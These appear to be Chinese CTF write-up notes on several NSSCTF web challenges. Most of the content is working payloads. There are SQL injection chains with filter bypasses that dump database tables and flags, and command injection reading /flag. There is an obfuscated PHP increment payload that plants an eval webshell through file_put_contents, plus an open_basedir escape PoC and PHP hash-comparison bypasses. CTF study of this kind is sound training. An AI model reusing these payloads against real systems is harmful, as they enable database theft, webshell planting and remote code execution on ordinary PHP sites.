
## sql

###  按照标题参数wllm
?wllm=1 -- 正常
?wllm=1' -- 报错
?wllm=1'%23 -- 正常
?wllm=-1'or 1=1%23 -- 发现有过滤

### 测试过滤
空格，等号
空格=>`/**/`
等号=>like


### 注入
```sql
# 测试长度
?wlmm=1'order/**/by/**/3%23 -- 正常
?wlmm=1'order/**/by/**/4%23 -- 错误
-- 测试长度为3
# 测试回显
?wlmm=-1'union/**/select/**/1,2,3%23 # 2,3回显位置
# 查库
?wllm=-1'union/**/select/**/1,2,database()%23 # test_db
# 查表
?wllm=-1'union/**/select/**/1,2,group_concat(table_name)/**/from/**/informa
tion_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23
-- LTLT_flag,users
# 查列
?wllm=-1'union/**/select/**/1,2,group_concat(column_name)/**/from/**/inform
ation_schema.columns/**/where/**/table_schema/**/like/**/'test_db'%23
-- id,flag,id,username
# 查内容
?wllm=-1'union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_
flag%23
-- NSSCTF{e99758c1-d31b

# 位数长度不足
使用截断函数进行绕过，substr，right，REVERSE 被过滤（测试出来的），只能用mid
# mid截取，因为回显只能有20个，所以20，一组截取
wllm=-1'union/**/select/**/1,2,mid(group_concat(flag),20,20)/**/from/**/tes
t_db.LTLT_flag%23
# 需要读三组
NSSCTF{e99758c1-d31b-4497-8d44-abfe84caa0ed}
```



## finalrce
![[Pasted image 20231207115411.png]]


用到tee命令：
Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。
```
?url=tac /flllll\aaaaaaggggggg |tee 3.txt
```



## numgame

![[Pasted image 20231208100218.png]]

post传入：p=nss::ctf    提示类是nss2，使用nss2::ctf，查看源码获取到flag




## ez_sql

or被过滤，影响了information，order，等等要用的东西
union被过滤，双写 ununionion绕过
空格被过滤，`/**/`绕过
注释符--+无法使用，使用#的编码，%23
```sql
>
nss=-1'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23  
< Flag: 2  
This is true flag: NSS_tb,users   
>
nss=-1'/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'/**/limit/**/1,1%23  
  
< Flag: 2  
This is true flag: id,Secr3t,flll444g  
  
  
> nss=-1'/**/ununionion/**/select/**/id,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1%23  
  
< Flag: NSSCTF{b3c1613c-6acb-46f4-9510-f3184bd69eb5}  
This is true flag: NSSCTF{I_d0nt_want_t0_w4ke_up}
```



## hardRCE3

取反和异或被禁用了，只有尝试下自增
get传
```
%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b’!‘%3d%3d’%40’%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d’_'%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b
```
![[Pasted image 20231208141112.png]]
```
发现system,exec,shell_exec,popen,proc_open,passthru被禁用 .

但是可以用file_put_contents(,)

file_put_contents函数 第一个参数是文件名，第二个参数是内容。

所以 构造: _=file_put_contents("1.php","<?php evVVVal($_POST['shell']); ?>");传入🐎

然后访问/1.php，密码shell连接。

```
但是连接后没有权限
重新写个poc
```php
<?php
print_r(ini_get('open_basedir').'<br>');
mkdir('test');
chdir('test');
ini_set('open_basedir','..');
chdir('..');
chdir('..');
chdir('..');
ini_set('open_basedir','/');
echo file_get_contents('/flag');
print(1);
?>

#poc:
_=file_put_contents('5.php',"<?php print_r(ini_get('open_basedir').'<br>');mkdir('test');chdir('test');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo file_get_contents('/flag');print(1);?>")
```


## funnyphp

![[Pasted image 20231208142043.png]]

可知：get:   num=9e9&str=NSSNSSCTFCTF
post:  md5_1=QNKCDZO&md5_2=240610708



## babysql
联合注入：
```sql
username=1'union/**/select/**/(select/**/group_concat(flag)/**/from/**/flag)/**/'
```



## PINGpingping
![[Pasted image 20231208163424.png]]
### payload
```
php解析问题  
空格和点会解析为下划线（_)  
所以传入参数时会解析为Ping_ip_exe导致传参失败，查找资料在8版本一下[会解析为_且会导致解析错误，使后续符号不继续解析  
Ping[ip.exe  
再进行后续flag读取

Ping[ip.exe=|cat /flag
```



## 一键连接

![[Pasted image 20231208164328.png]]

payload
```
?md5_1[]=1&md5_2[]=2&sha1_1[]=1&sha1_2[]=2&new_player=data://text/plain,Welcome to NSSCTF!!!
```


